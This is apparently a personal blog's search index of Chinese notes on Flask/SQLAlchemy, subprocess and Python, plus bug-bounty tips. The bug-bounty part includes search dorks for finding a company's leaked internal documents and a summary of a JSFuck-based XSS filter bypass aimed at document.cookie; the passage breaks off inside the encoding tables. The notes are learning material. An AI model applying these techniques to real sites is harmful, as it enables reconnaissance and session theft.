<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2019.11.20-星期三</title>
      <link href="/posts/12fdade9/"/>
      <url>/posts/12fdade9/</url>
      
        <content type="html"><![CDATA[<h2 id="flask-sqlalchemy-中更新对象的坑"><a class="markdownIt-Anchor" href="#flask-sqlalchemy-中更新对象的坑"></a> flask-sqlalchemy 中更新对象的坑?</h2><p>有效</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">t = db.session.query(models.TaskModel).filter_by(id=plugin.id).first()</span><br><span class="line">t.status = <span class="string">"已完成"</span> <span class="keyword">if</span> success <span class="keyword">else</span> <span class="string">"异常"</span></span><br><span class="line">db.session.commit()</span><br></pre></td></tr></table></figure><p>无效,这样只是获取到一个models.TaskModel的复制对象，无法更改</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">t = models.TaskModel.query.filter_by(id=plugin.id).first()</span><br><span class="line">t.status = <span class="string">"已完成"</span> <span class="keyword">if</span> success <span class="keyword">else</span> <span class="string">"异常"</span></span><br><span class="line">db.session.commit()</span><br></pre></td></tr></table></figure><h2 id="flask-sqlalchemy-排序"><a class="markdownIt-Anchor" href="#flask-sqlalchemy-排序"></a> flask-sqlalchemy 排序</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">results = session.query(User).order_by(User.create_time.desc()).all()</span><br><span class="line">results = session.query(User).order_by(<span class="string">"-create_at"</span>).all()</span><br><span class="line">results = session.query(User).order_by( desc(<span class="string">'total_real_income'</span>))</span><br></pre></td></tr></table></figure><p>多个条件进行逗号隔开</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">User.query.order_by(User.popularity.desc(),User.date_created.desc()).limit(<span class="number">10</span>).all()</span><br></pre></td></tr></table></figure><p>对model进行默认排序</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(Base)</span>:</span>　　</span><br><span class="line">　　__tablename__ = <span class="string">"user"</span>　　</span><br><span class="line">　　id = Column(Integer , primary_key=<span class="literal">True</span> , autoincrement=<span class="literal">True</span>)　　</span><br><span class="line">　　name = Column(String(<span class="number">50</span>) , nullable=<span class="literal">False</span>)　　</span><br><span class="line">　　create_time = Column(DateTime , nullable=<span class="literal">False</span> , default=datetime.now)</span><br><span class="line">　　</span><br><span class="line">　　__mapper_args__ = &#123;　　</span><br><span class="line">　　<span class="string">"order_by"</span>:create_time.desc()　　</span><br><span class="line">　　&#125;　　</span><br><span class="line">　　<span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span>　　</span><br><span class="line">　　      <span class="keyword">return</span> <span class="string">"name:%s,create_time:%s"</span>%(self.name,self.create_time)</span><br></pre></td></tr></table></figure><h2 id="js的for-in"><a class="markdownIt-Anchor" href="#js的for-in"></a> js的for-in</h2><p>是遍历对象的属性的，不是普通的遍历</p><h2 id="python中的类变量"><a class="markdownIt-Anchor" href="#python中的类变量"></a> python中的类变量</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(Base)</span>:</span>　　</span><br><span class="line">　　__tablename__ = <span class="string">"user"</span></span><br></pre></td></tr></table></figure><p>这就是类变量，不是对象的变量</p><h2 id="flask-sqlalchemy-dbsessionmerge-的坑"><a class="markdownIt-Anchor" href="#flask-sqlalchemy-dbsessionmerge-的坑"></a> flask-sqlalchemy db.session.merge 的坑</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">plugin = tasksing.get(id)</span><br><span class="line">plugin.t.status=<span class="string">"已停止"</span></span><br><span class="line">plugin.t.log=plugin.get_log()</span><br><span class="line"><span class="keyword">del</span> tasksing[plugin.t.id]</span><br><span class="line">db.session.merge(plugin.t)</span><br><span class="line">db.session.commit()</span><br></pre></td></tr></table></figure><p>merge方法要放在更新数据之后<br>session.merge()方法会首先发送一句select语句，去数据库端获取UserInfo持久化标识所对应的表记录；然后自动生成一个持久化状态的UserInfo实体，与脱管状态的UserInfo实体做比较是否有所改变；一旦发生了改变，才会发送update语句执行更新。</p>]]></content>
      
      
      <categories>
          
          <category> get√ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2019.11.19-星期二</title>
      <link href="/posts/5c72d791/"/>
      <url>/posts/5c72d791/</url>
      
        <content type="html"><![CDATA[<h2 id="subprocess-执行命令读取无输入"><a class="markdownIt-Anchor" href="#subprocess-执行命令读取无输入"></a> subprocess 执行命令，读取，无输入</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">p = subprocess.Popen(<span class="string">"exec cat"</span>,shell = <span class="literal">True</span>,start_new_session=<span class="literal">True</span></span><br><span class="line">    ,encoding=<span class="string">"utf8"</span>) </span><br><span class="line"><span class="comment">#start_new_session 是会生成一个新的进程组，当kill的时候会kill的干净</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取:注意此时如果程序已经结束了是读取不到任何东西的，因为p.poll()是检测子程序是否结束</span></span><br><span class="line"><span class="keyword">while</span> p.poll() <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">if</span> p.stdout:</span><br><span class="line">        out = p.stdout.readline()</span><br><span class="line">        <span class="keyword">if</span> out:<span class="comment">#这里当stdin close时 会获取为空的话就不打印了</span></span><br><span class="line">            print(out)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 所以在这里应该重新全部读一下</span></span><br><span class="line"><span class="keyword">if</span> p.stdout:</span><br><span class="line">    out = p.stdout.readlines()</span><br><span class="line">    <span class="keyword">if</span> out:<span class="comment">#这里当stdin close时 会获取为空的话就不打印了</span></span><br><span class="line">       <span class="keyword">for</span> log <span class="keyword">in</span> out:</span><br><span class="line">           print(out)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 杀掉进程直接kill</span></span><br><span class="line">p.kill()</span><br></pre></td></tr></table></figure><h2 id="subprocess-执行命令读取有输入"><a class="markdownIt-Anchor" href="#subprocess-执行命令读取有输入"></a> subprocess 执行命令，读取，有输入</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">p = subprocess.Popen(<span class="string">"exec cat"</span>,shell = <span class="literal">True</span>,start_new_session=<span class="literal">True</span></span><br><span class="line">    ,encoding=<span class="string">"utf8"</span>,stdin = subprocess.PIPE, stdout = subprocess.PIPE,stderr=subprocess.PIPE) </span><br><span class="line"><span class="comment">#start_new_session 是会生成一个新的进程组，当kill的时候会kill的干净</span></span><br><span class="line"><span class="comment">#有输入的时候需要把stdin stdout stderr 设置成管道</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 这样可以写入数据</span></span><br><span class="line">p.stdin.write(<span class="string">"aaaa\n"</span>)</span><br><span class="line">p.stdin.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取:注意此时如果程序已经结束了是读取不到任何东西的，因为p.poll()是检测子程序是否结束</span></span><br><span class="line"><span class="keyword">while</span> p.poll() <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">if</span> p.stdout:</span><br><span class="line">        out = p.stdout.readline()</span><br><span class="line">        <span class="keyword">if</span> out:<span class="comment">#这里当stdin close时 会获取为空的话就不打印了</span></span><br><span class="line">            print(out)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 所以在这里应该重新全部读一下</span></span><br><span class="line"><span class="keyword">if</span> p.stdout:</span><br><span class="line">    out = p.stdout.readlines()</span><br><span class="line">    <span class="keyword">if</span> out:<span class="comment">#这里当stdin close时 会获取为空的话就不打印了</span></span><br><span class="line">       <span class="keyword">for</span> log <span class="keyword">in</span> out:</span><br><span class="line">           print(out)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 杀掉进程直接kill</span></span><br><span class="line">p.kill()</span><br></pre></td></tr></table></figure><h2 id="subprogress进行封装封装类的使用方法"><a class="markdownIt-Anchor" href="#subprogress进行封装封装类的使用方法"></a> subprogress进行封装，封装类的使用方法</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(finshed)</span>:</span> <span class="comment"># 命令完成后的回调</span></span><br><span class="line">    print(<span class="string">"完成:%d"</span> % finshed)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">l</span><span class="params">(log)</span>:</span><span class="comment">#命令中日志的回调</span></span><br><span class="line">    print(log,end=<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line">c = Command(<span class="string">"ping www.baidu.com"</span>,on_finished=f,on_log=l)</span><br><span class="line">c.run(have_input=<span class="literal">False</span>)</span><br><span class="line"><span class="comment"># 有输入的时候的写法</span></span><br><span class="line"><span class="comment"># c.write("aaaa\n")</span></span><br><span class="line"><span class="comment"># c.write("aaaa\n",auto_close=False)</span></span><br><span class="line"><span class="comment"># c.close_write()</span></span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line">c.kill()</span><br></pre></td></tr></table></figure><p>封装类</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess,time,threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Command</span>:</span></span><br><span class="line">    cmd = <span class="literal">None</span></span><br><span class="line">    p = <span class="literal">None</span></span><br><span class="line">    _log = []</span><br><span class="line"></span><br><span class="line">    on_log = <span class="literal">None</span></span><br><span class="line">    on_finished = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,cmd,on_log,on_finished)</span>:</span></span><br><span class="line">        self.cmd = <span class="string">"exec "</span>+cmd</span><br><span class="line">        self.on_log=on_log</span><br><span class="line">        self.on_finished=on_finished</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self,have_input=False)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> have_input:</span><br><span class="line">            p = subprocess.Popen(self.cmd,shell=<span class="literal">True</span>,start_new_session=<span class="literal">True</span>,stdin = subprocess.PIPE, stdout = subprocess.PIPE,stderr=subprocess.PIPE,encoding=<span class="string">"utf8"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p = subprocess.Popen(self.cmd,shell=<span class="literal">True</span>,start_new_session=<span class="literal">True</span>)</span><br><span class="line">        self.p = p</span><br><span class="line">        thread = threading.Thread(target=self.t_read,args=(p,))</span><br><span class="line">        thread.start()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(self,stdin_str,auto_close=True)</span>:</span></span><br><span class="line">        self.p.stdin.write(stdin_str)</span><br><span class="line">        <span class="keyword">if</span> auto_close:</span><br><span class="line">            self.p.stdin.close()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.p.stdin.flush()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close_write</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.p.stdin.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">t_read</span><span class="params">(self,p)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> p.poll() <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">if</span> p.stdout:</span><br><span class="line">                out = p.stdout.readline()</span><br><span class="line">                <span class="keyword">if</span> out:  <span class="comment"># 这里当stdin close时 会获取为空的话就不打印了</span></span><br><span class="line">                    self._log.append(out)</span><br><span class="line">                    <span class="keyword">if</span> self.on_log:</span><br><span class="line">                        self.on_log(out)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="comment">## 当程序已经结束还未来得及读的时候，需要读一下</span></span><br><span class="line">        <span class="keyword">if</span> p.stdout:</span><br><span class="line">            out = p.stdout.readlines()</span><br><span class="line">            <span class="keyword">if</span> out:  <span class="comment"># 这里当stdin close时 会获取为空的话就不打印了</span></span><br><span class="line">                self._log.extend(out)</span><br><span class="line">                <span class="keyword">if</span> self.on_log:</span><br><span class="line">                    <span class="keyword">for</span> log <span class="keyword">in</span> out:</span><br><span class="line">                        self.on_log(log)</span><br><span class="line">        <span class="keyword">if</span> self.on_finished:</span><br><span class="line">            self.on_finished(p.returncode == <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">log</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>.join(self._log)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">kill</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.p.kill()</span><br></pre></td></tr></table></figure><h2 id="import-的fromlist"><a class="markdownIt-Anchor" href="#import-的fromlist"></a> <strong>import</strong> 的fromlist</h2><p>当模块名为package.module时，而且fromlist参数为空时，函数返回顶层的模块，也就是package模块。如果fromlist=[module]，则返回module。</p><p>所以，下面语句返回的结果是一样的：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">spam = __import__(<span class="string">'spam'</span>, globals(), locals(), [], <span class="number">-1</span>)</span><br><span class="line">spam = __import__(<span class="string">'spam.ham'</span>, globals(), locals(), [], <span class="number">-1</span>)</span><br></pre></td></tr></table></figure><p>而下面指定了fromlist，就可以获取到子模块。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">_temp = __import__(<span class="string">'spam.ham'</span>, globals(), locals(), [<span class="string">'eggs'</span>, <span class="string">'sausage'</span>], <span class="number">-1</span>)</span><br><span class="line">eggs = _temp.eggs</span><br><span class="line">saus = _temp.sausage</span><br></pre></td></tr></table></figure><p>总结</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__import__函数中的fromlist实际上是没有具体含义的，你可以理解为它只是一种标记，当它不为空的时候，import将为我们导入前面所写的字符串中最右边的模块。当它为空的时候，import将为我们导入字符串最左边的模块，仅此而已。</span><br></pre></td></tr></table></figure><h2 id="socketio中匿名函数中emit的注意事项"><a class="markdownIt-Anchor" href="#socketio中匿名函数中emit的注意事项"></a> socket.io中匿名函数中emit的注意事项</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> copy_current_request_context</span><br><span class="line"><span class="meta">@socketio.on('start_tasks', namespace='/domain')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_tasks</span><span class="params">(message)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">        tasks_dict = message.get(<span class="string">"tasks"</span>,<span class="literal">None</span>)</span><br><span class="line">        type = message.get(<span class="string">"type"</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> tasks_dict:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">"无task"</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">        @copy_current_request_context</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">log</span><span class="params">(plugin,message)</span>:</span></span><br><span class="line">            emit(<span class="string">"domain_log"</span>,&#123;<span class="string">"id"</span>:id,<span class="string">"log"</span>:log&#125;)</span><br></pre></td></tr></table></figure><p>需要加<code>@copy_current_request_context</code>注解</p>]]></content>
      
      
      <categories>
          
          <category> get√ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2019.11.18-星期一</title>
      <link href="/posts/a67c26f8/"/>
      <url>/posts/a67c26f8/</url>
      
        <content type="html"><![CDATA[<h2 id="sqlalchemy的model如何序列化为json"><a class="markdownIt-Anchor" href="#sqlalchemy的model如何序列化为json"></a> sqlalchemy的model如何序列化为json</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">as_dict</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> &#123;c.name: getattr(self, c.name) <span class="keyword">for</span> c <span class="keyword">in</span> self.__table__.columns&#125;</span><br></pre></td></tr></table></figure><h2 id="python中的抽象类和抽象方法"><a class="markdownIt-Anchor" href="#python中的抽象类和抽象方法"></a> python中的抽象类和抽象方法</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> abc <span class="keyword">import</span> abstractmethod,ABCMeta</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span><span class="params">(metaclass=ABCMeta)</span>:</span></span><br><span class="line"><span class="meta">    @abcstractmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">(Foo)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">obj=A()</span><br></pre></td></tr></table></figure><h2 id="sqlalchemy-连接数据库创建表结构"><a class="markdownIt-Anchor" href="#sqlalchemy-连接数据库创建表结构"></a> sqlalchemy 连接数据库，创建表结构</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sqlalchemy.ext.declarative <span class="keyword">import</span> declarative_base</span><br><span class="line"><span class="keyword">from</span> sqlalchemy <span class="keyword">import</span> Column, String, Integer, Text, create_engine</span><br><span class="line">engine = create_engine(<span class="string">'mysql+pymysql://root@localhost:3306/blog?charset=utf8'</span>)</span><br><span class="line">Base = declarative_base()</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span><span class="params">(Base)</span>:</span></span><br><span class="line"></span><br><span class="line">    __tablename__ = <span class="string">'userinfos'</span></span><br><span class="line"></span><br><span class="line">    id = Column(Integer, primary_key=<span class="literal">True</span>)</span><br><span class="line">    name = Column(String(<span class="number">64</span>))</span><br><span class="line">    qq = Column(String(<span class="number">11</span>))</span><br><span class="line">    phone = Column(String(<span class="number">11</span>))</span><br><span class="line">    link = Column(String(<span class="number">64</span>))</span><br><span class="line">    user_id = Column(Integer, ForeignKey(<span class="string">'users.id'</span>))</span><br><span class="line"></span><br><span class="line">Base.metadata.create_all(engine)</span><br></pre></td></tr></table></figure><h2 id="flask-sqlalchemy-连接数据库创建表结构"><a class="markdownIt-Anchor" href="#flask-sqlalchemy-连接数据库创建表结构"></a> flask-sqlalchemy 连接数据库，创建表结构</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask_sqlalchemy <span class="keyword">import</span> SQLAlchemy</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SQLALCHEMY_DATABASE_URI'</span>] = <span class="string">'sqlite:////tmp/test.db'</span></span><br><span class="line">app.config.setdefault(<span class="string">'SQLALCHEMY_TRACK_MODIFICATIONS'</span>, <span class="literal">True</span>)</span><br><span class="line">db = SQLAlchemy(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(db.Model)</span>:</span></span><br><span class="line">    id = db.Column(db.Integer, primary_key=<span class="literal">True</span>)</span><br><span class="line">    username = db.Column(db.String(<span class="number">80</span>), unique=<span class="literal">True</span>)</span><br><span class="line">    email = db.Column(db.String(<span class="number">120</span>), unique=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, username, email)</span>:</span></span><br><span class="line">        self.username = username</span><br><span class="line">        self.email = email</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;User %r&gt;'</span> % self.username</span><br></pre></td></tr></table></figure><h2 id="python中jsondump-和-jsondumps-有那些区别"><a class="markdownIt-Anchor" href="#python中jsondump-和-jsondumps-有那些区别"></a> python中json.dump() 和 json.dumps() 有那些区别？</h2><p>如果只是字符串之间的转换用dumps,文件用dump</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'name'</span> : <span class="string">'ACME'</span>,</span><br><span class="line">    <span class="string">'shares'</span> : <span class="number">100</span>,</span><br><span class="line">    <span class="string">'price'</span> : <span class="number">542.23</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">json_str = json.dumps(data)</span><br><span class="line">data = json.loads(json_str)</span><br></pre></td></tr></table></figure><p>文件中</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Writing JSON data</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'data.json'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    json.dump(data, f)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Reading data back</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'data.json'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = json.load(f)</span><br></pre></td></tr></table></figure><h2 id="flask-sqlalchemy-如何创建一个不关联表的基类供别的类继承"><a class="markdownIt-Anchor" href="#flask-sqlalchemy-如何创建一个不关联表的基类供别的类继承"></a> flask-sqlalchemy 如何创建一个不关联表的基类供别的类继承</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseModel</span><span class="params">(db.Model)</span>:</span></span><br><span class="line">    __abstract__ = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DomainModel</span><span class="params">(BaseModel)</span>:</span></span><br><span class="line">    __tablename__ = <span class="string">'domains'</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> get√ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>test</title>
      <link href="/posts/d87f7e0c/"/>
      <url>/posts/d87f7e0c/</url>
      
        <content type="html"><![CDATA[<p><a name="AvAeq"></a></p><h2 id="啊实打实的"><a class="markdownIt-Anchor" href="#啊实打实的"></a> 啊实打实的</h2><p><a name="9jgEH"></a></p><h2 id="啊是大啊是大"><a class="markdownIt-Anchor" href="#啊是大啊是大"></a> 啊是大啊是大</h2><p><a name="Uxe3j"></a></p><h3 id="啊是大啊是大-2"><a class="markdownIt-Anchor" href="#啊是大啊是大-2"></a> 啊是大啊是大</h3>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>BugbountyTips</title>
      <link href="/posts/ff79d90a/"/>
      <url>/posts/ff79d90a/</url>
      
        <content type="html"><![CDATA[<h2 id="上传文件后记得检测exif信息是否泄露"><a class="markdownIt-Anchor" href="#上传文件后记得检测exif信息是否泄露"></a> 上传文件后记得检测EXIF信息是否泄露</h2><p><a href="https://medium.com/@souravnewatia/exif-geolocation-data-not-stripped-from-uploaded-images-794d20d2fa7d" target="_blank" rel="noopener">EXIF Geolocation Data Not Stripped From Uploaded Images</a></p><h2 id="recon的方式类似google-dock的还有很多"><a class="markdownIt-Anchor" href="#recon的方式类似google-dock的还有很多"></a> recon的方式类似google dock的还有很多</h2><p><a href="https://blog.usejournal.com/how-recon-helped-samsung-protect-their-production-repositories-of-samsungtv-ecommerce-estores-4c51d6ec4fdd" target="_blank" rel="noopener">How “Recon” helped Samsung protect their production repositories of SamsungTv, eCommerce / eStores</a></p><p><img src="https://adddd-1251699369.cos.ap-shanghai.myqcloud.com/20191018095932.png" alt><br><img src="https://adddd-1251699369.cos.ap-shanghai.myqcloud.com/20191018095957.png" alt></p><p>site:coggle.it “companyname” 这个网站可以发现很多内部的图表<br>site:scribd.com “companyname” 这个网站可以发现一些内部的文档</p><h2 id="当爆破参数时响应内容中可能会含有参数"><a class="markdownIt-Anchor" href="#当爆破参数时响应内容中可能会含有参数"></a> 当爆破参数时，响应内容中可能会含有参数</h2><p><a href="https://gh0st.cn/archives/2019-10-01/1" target="_blank" rel="noopener">One Way to Find Hidden IDOR Vulnerability</a></p>]]></content>
      
      
      <categories>
          
          <category> get√ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>单词</title>
      <link href="/posts/29c49084/"/>
      <url>/posts/29c49084/</url>
      
        <content type="html"><![CDATA[<h2 id="reconnaissance-单词"><a class="markdownIt-Anchor" href="#reconnaissance-单词"></a> reconnaissance [#单词#]</h2><p>reconnaissance<br>英 /rɪˈkɒnɪsns/  美 /rɪˈkɑːnɪsns/<br>n. [军] 侦察；勘测（等于reconnoissance）；搜索；事先考查</p><p>AQUATONE is a set of tools for performing reconnaissance on domain names.</p><h2 id="not-necessarily-单词"><a class="markdownIt-Anchor" href="#not-necessarily-单词"></a> not necessarily [#单词#]</h2><p>not necessarily 不见得 未必 不一定 并不一定</p><p>why external funding is not necessarily an advantage</p><h2 id="methodological-perspective-单词"><a class="markdownIt-Anchor" href="#methodological-perspective-单词"></a> methodological perspective [#单词#]</h2><p>方法角度</p><p>This is a short story how I found this bug from a methodological perspective</p><h2 id="gives-insight-into-单词"><a class="markdownIt-Anchor" href="#gives-insight-into-单词"></a> gives insight into [#单词#]</h2><p>深入了解</p><p>Reading code not only makes fun but rather gives insight into a more detailed understanding of bugs as well as a chance to find bugs with quite some preconditions.</p><h2 id="managed-to"><a class="markdownIt-Anchor" href="#managed-to"></a> managed to</h2><p>设法</p><p>So I managed to get the whole abecedary without using lowercase letters.</p>]]></content>
      
      
      <categories>
          
          <category> get√ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>优质WriteUps</title>
      <link href="/posts/49ae5eb5/"/>
      <url>/posts/49ae5eb5/</url>
      
        <content type="html"><![CDATA[<h2 id="bypass-uppercase-filters-like-a-pro-xss-advanced-methods-writeup"><a class="markdownIt-Anchor" href="#bypass-uppercase-filters-like-a-pro-xss-advanced-methods-writeup"></a> Bypass Uppercase filters like a PRO (XSS Advanced Methods) [#writeup#]</h2><p><a href="https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce" target="_blank" rel="noopener">原文</a></p><p>这篇文章，作者先发现了一个参数回显，并且把这个参数的大写当成了js函数进行了执行，但是网站做出了以下过滤</p><ol><li>回显的参数全部变成了大写</li><li>过滤了, //, , .</li></ol><p>但是可以使用<code>&quot;,',[,],{,}</code></p><p>所以作者找到了网站 <a href="http://www.jsfuck.com/" target="_blank" rel="noopener">http://www.jsfuck.com/</a> --这个网站是将js代码转换成只用六个字符来表示,这六个字符是 <code>()+[]!</code></p><p>理论上使用这个网站转换一下是可以的，但是当作者真实用的时候却发现，仅仅转换一个alert(document.cookie),就有13000个字符的长度，而且作者发现当参数值的长度超过了2500，服务器就会返回 Error 400</p><p>作者开始研究这个转换网站的细节:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const SIMPLE = &#123;</span><br><span class="line">    &apos;false&apos;:      &apos;![]&apos;,</span><br><span class="line">    &apos;true&apos;:       &apos;!0&apos;,</span><br><span class="line">    &apos;undefined&apos;:  &apos;0[0]&apos;,</span><br><span class="line">    &apos;NaN&apos;:        &apos;+[!0]&apos;,</span><br><span class="line">    &apos;Infinity&apos;:   &apos;+(+!0+(!0+[])[!0+!0+!0]+[+!0]+[0]+[0]+[0])&apos; // +&quot;1e1000&quot;</span><br><span class="line">  &#125;;</span><br><span class="line">const CONSTRUCTORS = &#123;</span><br><span class="line">    &apos;Array&apos;:    &apos;[]&apos;,</span><br><span class="line">    &apos;Number&apos;:   &apos;(+0)&apos;,</span><br><span class="line">    &apos;String&apos;:   &apos;([]+[])&apos;,</span><br><span class="line">    &apos;Boolean&apos;:  &apos;(!0)&apos;,</span><br><span class="line">    &apos;Function&apos;: &apos;[][&quot;fill&quot;]&apos;,</span><br><span class="line">    &apos;RegExp&apos;:   &apos;Function(&quot;return/&quot;+0+&quot;/&quot;)()&apos;</span><br><span class="line">  &#125;;</span><br><span class="line">const MAPPING = &#123;</span><br><span class="line">    &apos;a&apos;:   &apos;(false+&quot;&quot;)[1]&apos;,</span><br><span class="line">    &apos;b&apos;:   &apos;([][&quot;entries&quot;]()+&quot;&quot;)[2]&apos;,</span><br><span class="line">    &apos;c&apos;:   &apos;([][&quot;fill&quot;]+&quot;&quot;)[3]&apos;,</span><br><span class="line">    &apos;d&apos;:   &apos;(undefined+&quot;&quot;)[2]&apos;,</span><br><span class="line">    &apos;e&apos;:   &apos;(true+&quot;&quot;)[3]&apos;,</span><br><span class="line">    &apos;f&apos;:   &apos;(false+&quot;&quot;)[0]&apos;,</span><br><span class="line">    &apos;g&apos;:   &apos;(false+[0]+String)[20]&apos;,</span><br><span class="line">    &apos;h&apos;:   &apos;(+(101))[&quot;to&quot;+String[&quot;name&quot;]](21)[1]&apos;,</span><br><span class="line">    &apos;i&apos;:   &apos;([false]+undefined)[10]&apos;,</span><br><span class="line">    &apos;j&apos;:   &apos;([][&quot;entries&quot;]()+&quot;&quot;)[3]&apos;,</span><br><span class="line">    &apos;k&apos;:   &apos;(+(20))[&quot;to&quot;+String[&quot;name&quot;]](21)&apos;,</span><br><span class="line">    &apos;l&apos;:   &apos;(false+&quot;&quot;)[2]&apos;,</span><br><span class="line">    &apos;m&apos;:   &apos;(Number+&quot;&quot;)[11]&apos;,</span><br><span class="line">    &apos;n&apos;:   &apos;(undefined+&quot;&quot;)[1]&apos;,</span><br><span class="line">    &apos;o&apos;:   &apos;(true+[][&quot;fill&quot;])[10]&apos;,</span><br><span class="line">    &apos;p&apos;:   